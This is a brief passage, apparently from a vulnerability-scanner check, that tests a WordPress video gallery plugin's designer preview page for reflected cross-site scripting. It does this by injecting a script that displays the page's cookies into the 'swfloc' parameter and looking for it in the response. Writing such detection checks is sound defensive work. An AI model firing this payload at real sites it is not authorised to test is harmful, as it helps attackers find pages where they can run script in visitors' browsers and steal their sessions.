...
url = dir + "/wp-content/plugins/dzs-videogallery/deploy/designer/" + "preview.php?swfloc=\"><script>alert(document.cookie)</script>";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\)</script>", extra_check: ">Video" )){
